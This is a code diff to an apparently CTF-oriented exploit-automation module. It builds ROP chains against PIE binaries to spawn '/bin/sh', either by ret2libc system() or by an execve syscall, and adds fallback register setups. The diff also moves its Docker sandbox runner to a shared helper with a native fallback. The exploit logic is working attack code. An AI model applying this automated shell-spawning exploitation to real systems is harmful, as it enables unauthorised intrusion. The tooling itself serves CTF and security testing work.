@@ -6,9 +6,7 @@ base), search the stack offset and alignment, jump to win() and confirm it. For 
 CTF targets. Needs the 'binoracle-pwn' image."""
 from __future__ import annotations
 
-import os
-import shutil
-import subprocess
+from ._sandbox import run_driver
 
 _DRIVER = r'''
 import sys, os, time
@@ -107,26 +105,48 @@ for off in [72, 64, 88, 56, 96, 104, 80, 40, 120, 112, 128, 136, 48, 152, 168, 2
         base = resolve_base(io)
         elf.address = base                      # rebases symbols, gadgets and search() to absolute
         binsh = next(elf.search(b"/bin/sh\x00"), None)
-        rop = ROP(elf)
-        built = False
-        try:
-            sysaddr = (elf.plt.get("system") if elf.plt else None) or (elf.symbols or {}).get("system")
-            if binsh is not None and sysaddr:
+        built = False; chain = b""
+        sysaddr = (elf.plt.get("system") if elf.plt else None) or (elf.symbols or {}).get("system")
+        if binsh is not None and sysaddr:
+            try:
+                rop = ROP(elf)
                 try: rop.raw(rop.find_gadget(["ret"]).address)
                 except Exception: pass
-                rop.call(sysaddr, [binsh]); built = True         # ret2libc system('/bin/sh')
-            elif binsh is not None:
-                rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
-                sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
-                if sc: rop.raw(sc.address); built = True          # execve('/bin/sh') syscall
-        except Exception:
-            built = False
+                rop.call(sysaddr, [binsh]); chain = rop.chain(); built = True   # ret2libc system('/bin/sh')
+            except Exception:
+                built = False
+        if not built and binsh is not None:
+            # execve('/bin/sh',0,0) via syscall. Prefer pwntools' high-level execve() helper: it can
+            # stitch together awkward gadgets that manual setRegisters() cannot -- e.g. a
+            # `pop rdx; leave; ret` (the only rdx control in some binaries) whose `leave` needs a
+            # stack pivot. Confirmed on ropme_pie: manual `rop.rdx=0` raises, rop.execve() builds a
+            # working chain and gets a shell.
+            try:
+                rop = ROP(elf)
+                rop.execve(binsh, 0, 0)
+                chain = rop.chain(); built = True
+            except Exception:
+                built = False
+            # Fallbacks if execve() can't: some binaries have no CLEAN `pop rdx`/`pop rsi` at all, so
+            # DON'T force them -- rely on rsi/rdx already being 0 at the crash site (common right
+            # after the vulnerable read). Try full register control first, then progressively fewer.
+            if not built:
+                for want in ({"rax": 0x3b, "rdi": binsh, "rsi": 0, "rdx": 0},
+                             {"rax": 0x3b, "rdi": binsh, "rsi": 0},
+                             {"rax": 0x3b, "rdi": binsh}):
+                    try:
+                        rop = ROP(elf)
+                        sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
+                        if not sc:
+                            break               # no syscall gadget at all: another offset won't help
+                        for r, v in want.items():
+                            setattr(rop, r, v)
+                        rop.raw(sc.address)
+                        chain = rop.chain(); built = True; break
+                    except Exception:
+                        continue
         if not built:
             io.close(); break                   # gadgets/binsh missing: retrying won't help, next offset
-        try:
-            chain = rop.chain()
-        except Exception:
-            io.close(); break
         try:
             io.sendline(b"A" * off + chain)
             time.sleep(0.5); io.sendline(b"echo " + MARK)
@@ -141,42 +161,10 @@ print("NOT_VERIFIED"); sys.exit(1)
 
 
 def _run_pie_driver(binary: str, driver: str, tmpname: str) -> dict:
-    """Shared runner: write `driver` next to the binary and execute it in the binoracle-pwn
-    sandbox (ASLR off, no network). Returns {ok, verified, detail, output, note}."""
-    if not shutil.which("docker"):
-        return {"ok": False, "note": "docker no disponible"}
-    try:
-        img = subprocess.run(["docker", "image", "inspect", "binoracle-pwn"],
-                             capture_output=True, timeout=15).returncode
-    except subprocess.TimeoutExpired:
-        return {"ok": False, "note": "docker no responde (image inspect timeout)"}
-    if img != 0:
-        return {"ok": False, "note": "falta la imagen 'binoracle-pwn' (make pwn-image)"}
-    d = os.path.dirname(os.path.abspath(binary)); name = os.path.basename(binary)
-    if not os.path.isdir(d):
-        return {"ok": False, "note": f"directorio del binario inexistente: {d}"}
-    drv = os.path.join(d, tmpname)
-    try:
-        with open(drv, "w") as f:
-            f.write(driver)
-    except OSError as e:
-        return {"ok": False, "note": f"no se pudo escribir el driver: {e}"}
-    try:
-        r = subprocess.run(
-            ["docker", "run", "--rm", "--platform", "linux/amd64", "--network", "none",
-             "--memory", "512m", "--pids-limit", "256", "--security-opt", "seccomp=unconfined",
-             "-v", d + ":/w", "-w", "/w", "binoracle-pwn", "bash", "-c",
-             f"chmod +x ./{name}; python3 {tmpname} {name}"],
-            capture_output=True, text=True, timeout=200)
-        out = r.stdout + r.stderr
-    except subprocess.TimeoutExpired:
-        out = "[timeout]"
-    finally:
-        try: os.unlink(drv)
-        except OSError: pass
-    verified = "VERIFIED" in out and "NOT_VERIFIED" not in out
-    line = next((l for l in out.splitlines() if l.startswith("VERIFIED")), "")
-    return {"ok": True, "verified": verified, "detail": line, "output": out[-600:]}
+    """Shared runner: write `driver` next to the binary and execute it, preferring the
+    binoracle-pwn Docker image and falling back to the native sandbox (ASLR off, no network,
+    rlimits) when the image is absent. Returns {ok, verified, detail, output, engine}."""
+    return run_driver(binary, driver, tmpname)
 
 
 def autopie_rop(binary: str, run: bool = True) -> dict:
